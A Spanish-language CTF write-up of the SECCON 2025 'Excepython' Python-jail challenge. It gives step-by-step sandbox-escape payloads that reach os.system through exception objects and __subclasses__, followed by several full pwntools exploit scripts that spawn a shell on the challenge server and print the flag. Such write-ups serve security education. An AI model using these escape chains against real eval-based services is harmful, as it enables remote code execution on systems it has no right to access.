---
title: Excepython - SecconCTF2025
author: Kesero
description: Reto basado en escapar de una jail en Python mediante el uso de excepciones sin builtins
date: 2025-12-14 17:28:00 +0100
categories: [Writeups Competiciones Internacionales, Miscelánea]
tags: [Misc, Misc - Pyjail, Otros - Writeups, Dificultad - Difícil, SecconCTF]
pin: false
math: true
mermaid: true
image:
  path: https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/SecconCTF2025/Jail/Excepython/prompt.png
  lqip: 
  alt: 
comments: true
---

Autor del reto: `Ark`

Veces resuelto: 69

Dificultad: <font color=red>Difícil</font>

## Archivos

En este reto, se tienen los siguientes archivos:

- `excepython.tar.gz` : Contiene el Docker de la infraestructura del reto.
- `nc excepython.seccon.games 5000`: Conexión por netcat al servidor.


```
excepython.tar.gz
|
├── compose.yaml
├── Dockerfile
├── flag.txt
└── jail.py
```

Archivos utilizados en mi [repositorio de GitHub](https://github.com/k3sero/Blog_Content/tree/main/Competiciones_Internacionales_Writeups/2025/SecconCTF2025/Jail/Excepython).

## Analizando el código

En el archivo `jail.py` se encuentra el siguiente código:

```py
#!/usr/local/bin/python3
ex = None
while (code := input("jail> ")) and all(code.count(c) <= 1 for c in ".,(+)"):
    try:
        eval(code, {"__builtins__": {}, "ex": ex})
    except Exception as e:
        ex = e
```

Este script es una **jail de Python** que permite al usuario evaluar expresiones, dejando que cada uno de los caracteres `.` `,` `(` `+` solo aparezca una vez. Dicho código se ejecuta en un entorno sin funciones integradas (sin `__builtins__`), solo con acceso a `ex`, que guarda la última excepción ocurrida. 


## Solver

El código tiene dos restricciones principales: no se encuentran las funciones de `builtins` disponibles y el límite de caracteres `.,(+)` solo puede aparecer un máximo de 1 vez por línea.

Para resolver esta jail, se debe generar errores controlados que almacenen objetos útiles, hacer uso de walrus para reasignar la variable `ex` en listas de comprensión, usar cadenas de reflexión y reutilizar cada error guardado para permitir ejecutar comandos.

El desglose principal que se debe hacer es el siguiente.

1. Primera línea: `1/0`:

    ```python
    1/0
    ```
    Se genera una excepción `ZeroDivisionError` que se guarda en la variable `ex`, permitiendo que `ex` contenga el objeto de excepción que usaremos como punto de entrada.

2. Segunda línea: `"{0\x2e__class__\x2e__mro__[4]\x2e__subclasses__\x2epouet}".format(ex)`

    ```python
    "{0\x2e__class__\x2e__mro__[4]\x2e__subclasses__\x2epouet}".format(ex)
    ```

    Para evadir el uso del `.`, se usa `\x2e` (código hexadecimal) en lugar de `.` para evadir la restricción.

    - `format(ex)` intenta formatear la cadena usando `ex`
    - Al procesar `{0\x2e...}`, Python evalúa atributos de `ex`
    - El `\x2e` se decodifica como `.` dentro del string, evadiendo el límite
    - Navega: `ex.__class__.__mro__[4].__subclasses__`
    - `__class__`: clase de la excepción
    - `__mro__`: jerarquía de clases (Method Resolution Order)
    - `[4]`: accede a `object` (clase base)
    - `__subclasses__`: obtiene todas las subclases de `object`

    En este caso, Python evalúa `__subclasses__` como método no llamado, y `.format()` lo intenta llamar sin argumentos. Esto genera un TypeError con el método bound guardado en `ex.obj`.

3. Tercera línea: `[[ex := ex.obj()[167]] for i in '12']`

    ```python
    [[ex := ex.obj()[167]] for i in '12']
    ```

    - `ex.obj()`: llama al método `__subclasses__()` almacenado en la excepción anterior
    - `[167]`: selecciona una subclase específica del índice 167
    - Típicamente es algo como `<class 'warnings.catch_warnings'>` o similar que tiene acceso a `__builtins__`
    - `ex := ...`: asigna esta clase a `ex` usando el operador walrus (`:=`)
    - `for i in '12'`: ejecuta dos veces (técnica común en pyjails para ejecutar código)

    En este punto, `ex` contiene una clase que tiene acceso a los builtins.


4. Cuarta línea `"{0\x2eobj\x2e__init__\x2e__builtins__[__import__]\x2epouet}".format(ex)`

    ```python
    "{0\x2eobj\x2e__init__\x2e__builtins__[__import__]\x2epouet}".format(ex)
    ```

    - Navega desde `ex` → `__init__` → `__builtins__` → `__import__`
    - Accede a la función `__import__` que permite importar módulos
    - Similar a antes, genera un error que guarda `__import__` en `ex.obj`


5. Quinta línea: `[[ex := ex.obj('os') for i in '12']]`

    ```python
    [[ex := ex.obj('os') for i in '12']]
    ```

    - `ex.obj('os')`: ejecuta `__import__('os')` importando el módulo `os`
    - Asigna el módulo `os` a `ex`


6. Sexta línea: `"{0\x2eobj\x2esystem\x2epouet}".format(ex)`

    ```python
    "{0\x2eobj\x2esystem\x2epouet}".format(ex)
    ```

    - Accede a `os.system` (la función para ejecutar comandos del sistema)
    - Guarda `os.system` en `ex.obj` mediante otro error de formato


7. Séptima línea: `ex.obj('/bin/bash')`

    ```python
    ex.obj('/bin/bash')
    ```

    Finalmente obtenemos una terminal en el sistema.

```
┌──(kesero㉿kali)-[~]
└─$ nc excepython.seccon.games 5000

    jail> 1/0
    jail> "{0\x2e__class__\x2e__mro__[4]\x2e__subclasses__\x2epouet}".format(ex)
    jail> [[ex := ex.obj()[167]] for i in '12']
    jail> "{0\x2eobj\x2e__init__\x2e__builtins__[__import__]\x2epouet}".format(ex)
    jail> [[ex := ex.obj('os') for i in '12']]
    jail> "{0\x2eobj\x2esystem\x2epouet}".format(ex)
    jail> ex.obj('/bin/bash')
    ls /

    app bin boot dev etc flag-d108ec7a911b72568e8aa0855f1787d8.txt home lib 
    lib64 media mnt opt proc root run sbin srv sys tmp usr var

    cat /flag-d108ec7a911b72568e8aa0855f1787d8.txt

    SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
```

El siguiente código realiza el proceso anterior de manera automática:

```py
from pwn import *
import sys

HOST = 'excepython.seccon.games'  
PORT = 5000        

payloads = [
    b'1/0',
    b'"{0\\x2e__class__\\x2e__mro__[4]\\x2e__subclasses__\\x2epouet}".format(ex)',
    b'[[ex := ex.obj()[167]] for i in \'12\']',
    b'"{0\\x2eobj\\x2e__init__\\x2e__builtins__[__import__]\\x2epouet}".format(ex)',
    b'[[ex := ex.obj(\'os\') for i in \'12\']]',
    b'"{0\\x2eobj\\x2esystem\\x2epouet}".format(ex)',
    b'ex.obj(\'/bin/bash\')'
]

def exploit():

    print("[*] Conectando al servidor remoto...")
    io = remote(HOST, PORT)
    
    io.recvuntil(b'jail> ')
    
    for i, payload in enumerate(payloads, 1):
        print(f"[+] Enviando payload {i}/{len(payloads)}: {payload.decode()}")
        io.sendline(payload)
        
        # Para el último payload (bash), no esperar más prompts
        if i < len(payloads):
            try:
                io.recvuntil(b'jail> ', timeout=2)
            except:
                pass
    
    print("[!] Shell obtenida")
    
    io.sendline(b'cat ../flag*')
    io.interactive()

def main():

    exploit()

if __name__ == '__main__':
    main()
```

## Otras maneras

Mediante el uso de `funciones Lambada` se puede llegar a la misma conclusión:

```py
#!/usr/bin/env python3

from pwn import *

if args.DEBUG:
    context.log_level = "DEBUG"

host, port = "excepython.seccon.games", 5000

rr  = lambda *x, **y: io.recvrepeat(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
rc  = lambda *x, **y: io.recv(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)

# -- Exploit goes here --

io = remote(host, port)

payloads = """
    1/0

    # args[0] = lambda function
    # args[1] = exception instance
    # args[2] = attribute name to get from exception instance

    # (lambda, ZeroDivisionError('division by zero'))
    {}[ lambda *args: [args[0]] + [args[1].__getattribute__( *args[2:][-2:] )], ex ]

    # (lambda .__class__, <class 'ZeroDivisionError'>)
    {}[ *[a:=ex.args[0], a[0]( *[*a]+["__class__"] )][1] ]

    # (lambda .__class__, <class 'type'>)
    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__class__"] )][1] ]

    # (lambda .__base__, <class 'object'>)
    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__base__"] )][1] ]

    # (lambda .__subclasses__, <built-in method __subclasses__>)
    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__subclasses__"] )][1] ]

    # (lambda .__subclasses__(), <class 'os._wrap_close'>)
    {}[ *[ a:=ex.args[0], [a[0]]+[a[1]()[167]] ][1] ]

    # (lambda, <function _wrap_close.__init__>)
    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__init__"] )][1] ]

    # (<built-in function system>, )
    {}[ [a:=ex.args[0], a[0]( *[*a]+["__globals__"] )[1]["system"] ][1] ]

    ex.args[0]("sh")
"""

for payload in payloads.strip().splitlines():
    payload = payload.strip()
    if payload.startswith("#"): continue
    payload = payload.split("#", 1)[0].strip()
    if not payload: continue
    sla(b"jail> ", payload.strip().encode())

io.interactive() # SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
io.close()
```

Otra forma con `funciones Lambda`:

```py
{}[lambda f: ''.__class__,ex]
{}[[x:=ex.args[0],x][0][0](x[1])]
{}[lambda f: f.__base__,ex]
{}[*[x:=lambda f:f.args][0](ex)[0],x]
{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
{}[[x:=ex.args[0],x][0][0](x[1])]
{}[lambda f: f.__subclasses__(),ex]
{}[*[x:=lambda f:f.args][0](ex)[0],x]
{}[*[f:=ex.args[0]][0][:1],[f[2](f[1])[0]][0]]
{}[*[x:=ex.args[0],x][0][0](x[1])] # edited to unpack subclasses
{}[lambda f: [c for c in f if 'wrap_close' in ''.__class__(c)][0],ex]
{}[*[x:=lambda f:f.args][0](ex)[0],x]
{}[*[f:=ex.args[0]][0][:1],[f[2](f[1])[0]][0]]
{}[[x:=ex.args[0],x][0][0](x[1])]
{}[lambda f: f.__init__,ex]
{}[*[x:=lambda f:f.args][0](ex)[0],x]
{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
{}[[x:=ex.args[0],x][0][0](x[1])]
{}[lambda f: f.__globals__['sys'],ex]
{}[*[x:=lambda f:f.args][0](ex)[0],x]
{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
{}[[x:=ex.args[0],x][0][0](x[1])]
{}[lambda f: f.modules['os'],ex]
{}[*[x:=lambda f:f.args][0](ex)[0],x]
{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
{}[[x:=ex.args[0],x][0][0](x[1])]
{}[lambda f: f.system('sh'),ex]
{}[*[x:=lambda f:f.args][0](ex)[0],x]
{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
{}[[x:=ex.args[0],x][0][0](x[1])]
```

Otra solución en 3 líneas es la siguiente:

```py
x
'{0\x2e__traceback__\x2etb_frame\x2ef_globals[__builtins__]\x2eexec\x2ea}'.format(ex)
ex.obj('\x65\x78\x2e\x5f\x5f\x74\x72\x61\x63\x65\x62\x61\x63\x6b\x5f\x5f\x2e\x74\x62\x5f\x66\x72\x61\x6d\x65\x2e\x66\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5b\x22\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x22\x5d\x2e\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2a\x22\x29')
```

Otra solución compacta:

```py
from pwn import *

context(log_level="DEBUG")

io = remote("excepython.seccon.games", 5000)

# attack chain:
# [].__setattr__.__objclass__.__subclasses__()[167].__init__.__globals__["system"]("sh")
io.recvuntil(b"jail>")
io.sendline(b"{}[f := lambda x: x[0].__getattribute__(*x[1:])]")
io.recvuntil(b"jail>")
io.sendline(b"{}[f := ex.args[0], g := lambda x: f([x[0]]+x)]")
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args, g[0][0]([[]] + ["__setattr__"])]')
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args[0], g[0][0][0]([g[1]] + ["__objclass__"])]')
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args[0], g[0][0][0][1]([g[1]] + ["__subclasses__"])]')
io.recvuntil(b"jail>")
io.sendline(b"{}[g := ex.args[0], g[1]()[167]]")
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args[0], g[0][0][0][0][0][1]([g[1]] + ["__init__"])]')
io.recvuntil(b"jail>")
io.sendline(
    b'{}[g := ex.args[0], g[0][0][0][0][0][0][0]([g[1]] + ["__globals__"])["system"]]'
)
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args[0], g[1]("sh")]')

# cat /flag*
# SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
io.interactive()
```

## Flag

`SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}`